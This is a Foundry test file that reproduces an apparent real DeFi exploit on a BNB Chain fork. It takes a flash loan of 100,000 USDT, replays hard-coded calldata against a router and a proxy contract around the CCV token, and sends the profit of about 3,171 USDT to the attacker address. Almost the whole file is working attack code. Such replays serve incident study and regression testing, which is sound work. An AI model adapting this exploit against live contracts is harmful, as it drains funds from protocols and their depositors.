
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34739873;
    uint256 constant TX_TIMESTAMP = 1703740110;
    uint256 constant TX_BLOCK_NUMBER = 34739874;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 3171894324298232046025);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function flashCallback() internal {
        _markCallback(0);
        IERC20Like(Addresses.CCV).approve(Addresses.A_10ED43_024E, type(uint256).max);
        {
            bytes memory replayCallData =
                hex"369baafe0000000000000000000000000000000000000000000001e7e9e5fa6f7a200000";
            (bool ok,) = Addresses.A_37177C_40B2.call(replayCallData);
            require(ok, "replay selector 0x369baafe failed");
        }
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000000152d02c7e14af6800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000b2f22296661ccc5530ebdbabb8264b82e977504d00000000000000000000000000000000000000000000000000000000658d02ce000000000000000000000000000000000000000000000000000000000000000200000000000000000000000055d398326f99059ff775485246999027b319795500000000000000000000000089c27d81941708dbc9aa4d905443392cb4a8ef73";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy);
        {
            bytes memory replayCallData =
                hex"b7da6a490000000000000000000000000000000000000000000001d293622a37f429735f";
            (bool ok,) = Addresses.ERC1967Proxy.call(replayCallData);
            require(ok, "replay selector 0xb7da6a49 failed");
        }
        IERC20Like(Addresses.CCV).balanceOf(address(this));
        {
            bytes memory replayCallData =
                hex"5c11d795000000000000000000000000000000000000000000000cb364a99aea0814e29b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000b2f22296661ccc5530ebdbabb8264b82e977504d00000000000000000000000000000000000000000000000000000000658d02ce000000000000000000000000000000000000000000000000000000000000000200000000000000000000000089c27d81941708dbc9aa4d905443392cb4a8ef7300000000000000000000000055d398326f99059ff775485246999027b3197955";
            (bool ok,) = Addresses.A_10ED43_024E.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.USDT).transfer(Addresses.A_6098A5_B476, 100000000000000000000000);

            Harness.vmExt().stopPrank();
        }
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtBalanceOfAttackAttackContract);
    }

    function _attack() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_37177C_40B2, type(uint256).max);
        {
            bytes memory flashLoanProof = hex"369baafe0000000000000000000000000000000000000000000001e7e9e5fa6f7a200000";
            IContract_6098A5_B476(Addresses.A_6098A5_B476)
                .flashLoan(0, 100000000000000000000000, address(this), flashLoanProof);
        }
    }

    receive() external payable {}

    function DPPFlashLoanCall(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        flashCallback();
        return;
    }

    function test(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        _attack();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_32A02A_0DF0 = 0x32A02A102Ca3ddB06CccEF17C1960Adde3c40DF0;
    address internal constant A_37177C_40B2 = 0x37177ccC66ef919894CeF37596BBebd76E7A40B2;
    address internal constant Cake_LP = 0x4da070F3c4295389ddFF6d4398650001e412cB39;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_6098A5_B476 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant attacker_eoa = 0x835B45D38cbDccf99E609436FF38E31Ac05bc502;
    address internal constant CCV = 0x89c27D81941708dBC9AA4d905443392cb4A8EF73;
    address internal constant attack_contract = 0xb2f22296661CCC5530eBDbAbB8264b82E977504D;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant ERC1967Proxy = 0xE38d7ff85bB801D35382eeF15eB8263F2c751ecd;
}

interface IContract_6098A5_B476 {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
